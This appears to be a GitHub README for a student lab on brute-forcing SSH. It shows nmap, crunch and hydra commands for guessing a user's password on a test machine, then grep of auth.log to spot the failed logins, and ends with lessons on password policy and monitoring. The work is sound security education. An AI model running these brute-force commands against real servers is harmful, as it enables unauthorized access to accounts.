# Brute Force SSH Lab

## 🔐 Overview

This project demonstrates how a brute-force SSH attack is conducted on a Linux server using tools like Nmap, Crunch, and Hydra. The goal of this lab is to simulate a weak password attack on a remote server and analyze the potential vulnerabilities of such a setup.

---

## 🛠️ Tools & Techniques Used

- **Nmap**: Scanned the target machine to identify open ports.
- **Crunch**: Created a custom wordlist based on numeric patterns.
- **Hydra**: Performed the brute-force attack using the wordlist.
- **Grep**: Analyzed SSH logs for failed login attempts.

---

## 🧪 Procedure

1. **Nmap Scan**: Identified open ports on the target machine.
    ```bash
    nmap -p 22 -sV UbuntuMachine
    ```
2. **Wordlist Creation**: Used Crunch to generate a numeric wordlist.
    ```bash
    crunch 4 4 1234567890 -o wordlist.txt
    ```
3. **Hydra Brute-Force Attack**: Used Hydra to attempt password login via SSH.
    ```bash
    hydra -l ubuntu_user -P wordlist.txt UbuntuMachine ssh
    ```
4. **Log Analysis**: Analyzed the logs to detect failed login attempts.
    ```bash
    grep "Failed password" /var/log/auth.log
    ```

---

## 🧠 Lessons Learned

- Simple brute-force attacks can compromise weak passwords.
- System logs provide critical evidence of attempted attacks.
- Stronger password policies and monitoring are essential to security.

---

## 📄 Full Lab Report (PDF)

[Lab Report Brute Force PDF.pdf](https://github.com/user-attachments/files/19912494/Lab.Report.Brute.Force.PDF.pdf)



